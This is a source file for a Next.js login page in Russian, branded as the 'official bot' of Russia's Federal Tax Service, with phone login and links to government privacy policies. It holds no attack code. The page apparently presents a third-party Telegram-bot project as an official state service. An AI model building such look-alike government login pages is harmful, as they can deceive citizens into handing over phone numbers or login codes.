import { LoginForm } from "@/components/LoginForm";
import { Logo } from "@/components/Logo";
import { getTelegramBot } from "@/lib/telegram-bot";

// Страница зависит от настроек сервера (токен бота, канал кодов), поэтому строится на каждый запрос.
export const dynamic = "force-dynamic";

export default async function LoginPage() {
  const bot = await getTelegramBot();
     const phoneEnabled = true;
  const dev = process.env.NODE_ENV !== "production";

  return (
    <main className="login">
      <div className="login-brand">
        <Logo size={84} />
        <div className="nm">
          <b>Официальный бот ФНС России</b>
          <span>Личный кабинет</span>
        </div>
      </div>
      <div className="login-spacer" />
      <h1 className="login-h">Вход в кабинет</h1>
      <p className="login-sub">Доходы, налоги и операции в одном месте. Войдите удобным способом.</p>
     <LoginForm
  botUsername={null}
  telegramProblem={null}
  phoneEnabled={phoneEnabled}
/>
     <p className="lnote">
  Нажимая «Войти», вы соглашаетесь с{" "}
  <a href="https://www.nalog.gov.ru/rn77/copyright/mobile_privacy_policy/selfemployed/" target="_blank" rel="noopener noreferrer">
     политикой конфиденциальности
  </a>{" "}
  и{" "}
  <a href="https://www.gosuslugi.ru/mobile_privacy_policy" target="_blank" rel="noopener noreferrer">
    политикой обработки персональных данных
  </a>
  .
</p>
    </main>
  );
}
